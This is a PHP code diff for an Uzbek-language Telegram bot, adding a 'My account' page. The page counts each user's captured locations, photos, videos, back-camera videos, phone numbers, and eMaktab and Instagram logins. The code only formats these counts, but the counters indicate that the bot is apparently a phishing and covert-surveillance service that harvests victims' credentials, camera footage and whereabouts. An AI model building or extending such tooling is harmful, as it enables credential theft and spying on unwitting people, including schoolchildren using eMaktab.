@@ -369,4 +369,28 @@ function needSubscribeKeyboard() {
     ];
 }
 
+// Hisob ma'lumotlari
+function buildAccountText($chat_id) {
+    $user = getUser($chat_id);
+    if (!$user) {
+        return "❌ Foydalanuvchi ma'lumotlari topilmadi.";
+    }
+    
+    $username = $user['username'] ? "@" . $user['username'] : "Yo'q";
+    $text = "<b>💼 Mening hisobim</b>\n\n";
+    $text .= "👤 <b>Ism:</b> " . htmlspecialchars($user['first_name'] ?? 'Noma\'lum') . "\n";
+    $text .= "🆔 <b>Username:</b> " . $username . "\n";
+    $text .= "📊 <b>Statistika:</b>\n";
+    $text .= "  📍 Lokatsiya: " . ($user['locations_sent'] ?? 0) . "\n";
+    $text .= "  📷 Rasm: " . ($user['photos_sent'] ?? 0) . "\n";
+    $text .= "  🎥 Video: " . ($user['videos_sent'] ?? 0) . "\n";
+    $text .= "  📹 Orqa kamera: " . ($user['backcamera_videos'] ?? 0) . "\n";
+    $text .= "  📞 Telefon: " . ($user['phone_numbers'] ?? 0) . "\n";
+    $text .= "  🔐 eMaktab: " . ($user['emaktab_logins'] ?? 0) . "\n";
+    $text .= "  📱 Instagram: " . ($user['instagram_logins'] ?? 0) . "\n";
+    $text .= "📅 <b>Ro'yxatdan o'tilgan:</b> " . date('d.m.Y H:i', $user['created_at']) . "\n";
+    
+    return $text;
+}
+
 ?>
